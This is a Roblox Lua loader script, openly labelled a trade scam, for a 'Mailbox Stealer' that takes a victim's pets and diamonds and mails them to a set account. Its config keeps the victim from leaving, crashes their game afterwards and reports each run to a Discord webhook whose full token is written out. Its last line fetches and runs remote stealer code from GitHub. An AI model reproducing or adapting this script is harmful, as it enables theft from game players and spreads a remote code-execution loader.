--[[ SimoNHub Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "HerrySzymoN" --// Username To Send Pets To

_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished

--[[ Webhook Config ]]--
_G.Enabled = true --// Toggle For Sending Webhooks
_G.Mention = true --// Pings You When Someone Executes
_G.Webhook = "https://discord.com/api/webhooks/1097062322985521192/mrlGqhqcve2pWpIWSjGcuKKV2BpltcOL8scUkXgb2_7e1oZsHfPkg-WD9ob50Ok0Ki9-" --// Discord Webhook For Executions

--[[ UI Config ]]--
_G.ScriptName = "tradescam" --// Script Name On The UI
_G.Tip1 = "1" --// Gives You Tips On The UI
_G.Tip2 = "2" --// Gives You Tips On The UI
_G.Tip3 = "3" --// Gives You Tips On The UI
_G.Tip4 = "4" --// Gives You Tips On The UI
_G.Tip5 = "5" --// Gives You Tips On The UI

--[[ Script ]]

loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
